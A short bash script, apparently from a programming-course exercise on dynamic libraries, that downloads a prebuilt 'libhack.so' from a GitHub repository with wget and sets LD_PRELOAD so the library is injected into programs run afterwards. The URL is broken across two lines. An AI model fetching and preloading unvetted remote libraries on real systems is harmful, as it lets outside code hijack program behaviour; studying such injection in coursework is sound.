#!/bin/bash
wget -P ../ https://raw.github.com/ifezue501/alx-
low_level_programming/master/0x18-dynamic_libraries/libhack.so
export LD_PRELOAD=../libhack.so
